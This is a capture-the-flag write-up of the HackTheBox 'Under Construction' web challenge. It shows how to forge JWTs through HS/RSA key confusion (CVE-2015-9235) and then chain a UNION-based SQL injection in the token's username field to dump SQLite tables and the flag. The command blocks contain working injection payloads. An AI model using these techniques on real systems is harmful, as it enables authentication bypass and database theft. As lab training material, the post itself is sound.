---
layout: post
title: PenLog - Under Construction by HackTheBox
categories: [HackTheBox, Penlog, Challenge, Web]
---

## Details

**Platform:** [HackTheBox](https://www.hackthebox.eu/)\
**Difficulty:** Medium\
**Link:** [Under Construction](https://app.hackthebox.eu/challenges/111)

## Enumeration

Start the challenge instance and download the resource package:

![challenge-page](/images/posts/penlog_under_construction_by_hackthebox/challenge_page.png)

Navigate the browser to _http://ip:port/_ and enter _test_ as the "Username" and "Password" and click "Register":

![register](/images/posts/penlog_under_construction_by_hackthebox/register.png)
_(**Note:** My instance was deployed at http://206.189.25.23:30830)_

Start `Burp Suite` and configure the browser's HTTP proxy:

![firefox-proxy](/images/posts/penlog_under_construction_by_hackthebox/firefox_proxy.png)
_(**Note:** My Burp proxy is the default: http://127.0.0.1:8080)_

With Burp running and intercepting HTTP traffic via the proxy, login to the web app with the registered test account.

"Forward" the initial login request via Burp:

![burp-login-request](/images/posts/penlog_under_construction_by_hackthebox/burp_login_request.png)

Again, using Burp, send the web app's redirect request, including the `Cookie: session=` token to Burp's "Repeater":

![burp-redirect-request](/images/posts/penlog_under_construction_by_hackthebox/burp_redirect_request.png)
_(**Note:**: Press Ctrl-R to send the request to Burp's repeater.)_

### JSON Web Token (JWT)

Perusing the provided `expressjs` web app's source code, the above session cookie, or, "token", is generated and sent as an HTTP redirect response in the route file "routes/index.js":

![login-token](/images/posts/penlog_under_construction_by_hackthebox/login_token.png)

The `JWTHelper.sign(...)` can be traced to the file "helpers/JWTHelper.js" which subsequently includes a `requires` for `jsonwebtoken`:

![requires-jsonwebtoken](/images/posts/penlog_under_construction_by_hackthebox/requires_jsonwebtoken.png)

Googling "jsonwebtoken vulnerabilities", this library is vulnerable to "Authentication Bypass", as described [here](https://snyk.io/test/npm/jsonwebtoken/4.0.0#npm:jsonwebtoken:20150331).

This vulnerability, known as [CVE-2015-9235](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235), describes "JWT HS/RSA key confusion vulnerability" whereby a vulnerable server-side (jsonwebtoken in this case) successfully verifies a token by erroneously:
1. Expecting "RSA" (public-private key scheme), but instead receiving "HSA256"(symmetric-key scheme); _an attacker can easily forge a token with an updated "alg"_
2. Blindly passing the re-purposed public-key as the verification key to the server-side verification method, confusing the _known_ public-key as the verification key for HS256

Copy the JWT token from the session cookie from the request in Burp's Repeater, and use [jwt.io](https://jwt.io) to decode it. Note the "alg" type "RS256" and that the payload data includes a public key element "pk":

![token-decoded](/images/posts/penlog_under_construction_by_hackthebox/token_decoded.png)

As shown above, the decoded JWT token's header designates "RS256" as the algorithm and the payload divulges the server-side public-key - the two requirements for CVE-2015-9235.

Download [jwt_forge.py](https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20) locally and copy the encoded JWT token from Burp's repeater to a file for easier management, e.g. "jwt_token_example.txt". Execute `jwt_forge.py` passing in the copied JWT token and registered username "test":

![jwt-forge-keyconfusion-test-1](/images/posts/penlog_under_construction_by_hackthebox/jwt_forge_keyconfusion_test_1.png)
_(**Note:** I wrote `jwt_forge.py` to learn about JWT tokens and solve the "Under Construction" challenge.)_

Copy the "forged" token from the terminal output and paste it over the current token in the request in Burp's Repeater window; send the request to the web app by pressing "Send" and confirm the user is still authenticated as "test":

![jwt-forge-keyconfusion-test-2](/images/posts/penlog_under_construction_by_hackthebox/jwt_forge_keyconfusion_test_2.png)

### SQL Injection (SQLi)

Spending more time reading the source code, there looks to be a simple SQL injection in "helpers/DBHelper.js" which interfaces to an `SQLite3` database; the user-supplied input variable `${username}` is concatenated with the SQL "SELECT" statement in the `DBHelper.getUser(...)` helper:

![login-token](/images/posts/penlog_under_construction_by_hackthebox/sqli_username.png)

`DBHelper.getUser(...)`, is called via the result of an async call from "middleware/AuthMiddleware.js"'s `AuthMiddleware` as highlighted in "routes/index.js":

![get-user-call](/images/posts/penlog_under_construction_by_hackthebox/get_user_call.png)

The provided parameter `req.data.username`, susequently passed to the SQLi vulnerability in `DBHelper.getUser(...)` is the username from the JWT token, extracted as of middleware `AuthMiddleware`:

![auth-middleware](/images/posts/penlog_under_construction_by_hackthebox/auth_middleware.png)

Re-forge the last "forged" JWT token using `jwt_forge.py`; pass a "UNION" injection to test the SQLi vulnerability:

![union-inject](/images/posts/penlog_under_construction_by_hackthebox/union_inject.png)

Again, copy the "forged" JWT token to the same Burp Repeater window and "Send" the request:

![union-inject-result](/images/posts/penlog_under_construction_by_hackthebox/union_inject_result.png)
_(**Note:** Having the "2" replace "test" as the username - this SQLi is **not** "blind".)_

With the `jwt_forge.py` + Burp Repeater process, inject the follow commands:

#### SQLite Version
```bash
$ python3 jwt_forge.py $(cat jwt_token_example.txt) \
    "test' and 1=2 UNION SELECT 1,sqlite_version(),3 -- -
...
```

![union-inject-sqlite-vers](/images/posts/penlog_under_construction_by_hackthebox/union_inject_sqlite_vers.png)

#### Database Table Names
```bash
$ python3 jwt_forge.py $(cat jwt_token_example.txt) \
    "test' and 1=2 UNION SELECT 1,group_concat(tbl_name),3 from sqlite_master -- -"
...
```

![union-inject-sqlite-tbl-names](/images/posts/penlog_under_construction_by_hackthebox/union_inject_sqlite_tbl_names.png)

#### Database Table SQL
```bash
$ python3 jwt_forge.py $(cat jwt_token_example.txt) \
    "test' and 1=2 UNION SELECT 1,group_concat(sql),3 from sqlite_master -- -"
```

![union-inject-sqlite-tbl-sql](/images/posts/penlog_under_construction_by_hackthebox/union_inject_sqlite_tbl_sql.png)

## Flag

Perform UNION injection to get the challenge flag and submit!

```bash
$ python3 jwt_forge.py $(cat jwt_token_example.txt) \
    "test' and 1=2 UNION SELECT 1,group_concat(top_secret_flaag),3 from flag_storage -- -"
```

![union-inject-flag](/images/posts/penlog_under_construction_by_hackthebox/union_inject_flag.png)